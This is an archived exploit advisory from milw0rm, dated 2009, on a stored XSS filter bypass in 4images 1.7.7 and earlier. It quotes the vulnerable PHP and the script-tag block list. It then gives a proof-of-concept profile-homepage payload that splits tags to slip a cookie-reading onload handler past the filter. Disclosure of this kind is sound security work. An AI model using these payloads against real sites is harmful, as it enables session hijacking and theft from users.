<html><head><title>4images <= 1.7.7 Filter Bypass HTML Injection/XSS Vulnerability</title></head><pre>                  ||          ||   | ||
           o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
          (  :  /    (_)    /           (      .


=By: 	Qabandi
=Email:	iqa[a]hotmail.fr

	From Kuwait, PEACE...

=Vuln:		4images &lt;= 1.7.7 - filter bypass HTML injection/XSS
=INFO:		~~~
=BUY:  		~~~
=DORK:  	~~~

                             _-=/:Conditions:\=-_
---------------------------------------------------------------------------------
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off

Comments allowed[+]
Registration[+]

Works on default 4images comments settings. 

XSS used works with latest FireFox browser, you can use your own code.
--------------------------------------=_=---------------------------------------

                            _-=/:Vulnerable_Code:\=-_
---------------------------------------------------------------------------------
in &quot;./4images/details.php&quot; we see::--//First-Mistake//--

380::        $comment_user_homepage = (isset($comment_row[$i][$user_table_fields['user_homepage']])) ? format_url($comment_row[$i][$user_table_fields['user_homepage']]) : &quot;&quot;;
381::        if (!empty($comment_user_homepage)) {

//as you can see, it just grabs whatever is in the SQL database and adds it, puts it thru format_url()
//which is nothing and relies on the filter when creating or editing USER_HOMEPAGE
//lets take a look what happends when updating user_homepage

in &quot;./4images/member.php&quot;:://this what happends when UPDATING user_homepage thru the profile page

1053::        $user_homepage = (isset($HTTP_POST_VARS['user_homepage'])) ? format_url(un_htmlspecialchars(trim($HTTP_POST_VARS['user_homepage']))) : &quot;&quot;;

//user_homepage goes thru THREE functions, lets see what they do..
//format_url();

function format_url($url) {
  if (empty($url)) {
    return '';
  }

  if (!preg_match(&quot;/^https?:\/\//i&quot;, $url)) {
    $url = &quot;http://&quot;.$url;
  }

  return $url;
}
///ok cool makes sure the URL is cool

//trim() &lt;-- built in PHP function

//un_htmlspecialchars();

function un_htmlspecialchars($text) {
  $text = str_replace(
    array('&amp;lt;', '&amp;gt;', '&amp;quot;', '&amp;amp;'),
    array('&lt;',    '&gt;',    '&quot;',      '&amp;'),
    $text
  );

  return $text;
}

//interesting but im afraid this is another mistake Q_Q

//anyway, point is the XSS filter in GLOBAL.PHP can be bypassed
// Lets take a small look at what the script does with all vars

in &quot;./4images/global.php&quot;::

181::  // Remove really unwanted tags
182::  do {
183::    $oldstring = $string;
184::    $string = preg_replace('#&lt;/*(applet|meta|xml|blink|link|style|script|embed|object|iframe|frame|frameset|ilayer|layer|bgsound|title|base)[^&gt;]*&gt;#i',&quot;&quot;,$string);
185::  } while ($oldstring != $string);
186::
187::  return $string;
188:: }

//Can be bypassed..
// since it looks for &lt;script&gt; and replaces it with nothing, we can use the old &lt;scr&lt;script&gt;ipt&gt; method
// but a bit more advanced.
---------------------------------------=_=--------------------------------------

                                 _-=/:P.o.C:\=-_
---------------------------------------------------------------------------------

all we need is a user account, so register then go to your edit profile:
( ./4images/member.php?action=editprofile )

at the HOMEPAGE input box, type the following:

http://www.dummy.com/&quot;&gt;&lt;script&gt;alert('qabandi')&lt;/script&gt;

The script will convert it to : 

http://www.dummy.com/&quot;&gt;alert('qabandi')

now type this :)

http://&quot;&gt;&lt;body&lt;script&gt; &lt;script&gt;on&lt;script&gt;loa&lt;script&gt;d=&quot;javascript:alert(document.cookie);qabandi&quot; /&gt;

Result after SAVE:

http://&quot;&gt;&lt;body onload=&quot;javascript:alert(document.cookie);qabandi&quot; /&gt;

BAAM!

go to any picture like ( ./4images/details.php?image_id=1 )

post a comment, refresh, and javascript will be executed.

you pretty much can bypass any of the wordlist provided in global.php

you can inject HTML code pretty much

now this is good because this shows that you can bypass their filter, what else can you do other than xss i wonder?

---------------------------------------=_=--------------------------------------

                                _-=/:SOLUTION:\=-_
---------------------------------------------------------------------------------
Im sure the 4images team wont take advice from a 19 year old :)
---------------------------------------=_=--------------------------------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-
-=-=-=-==-=-=-=-=tkfoon=-la=-tis2aloony=-shlon=-=el-=-ta6beeq!=-=-=-==-=-=-=-=-=
-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
-==-=-=-=-==-=-==-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=---=-==-=-==-=-=-=-=-=-=--
=-=-=-=-==-=-=--=-=-=-=-=-=-=-No----More---Private=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-
Salamz to All Muslim Hackers.

# milw0rm.com [2009-06-12]</pre></html>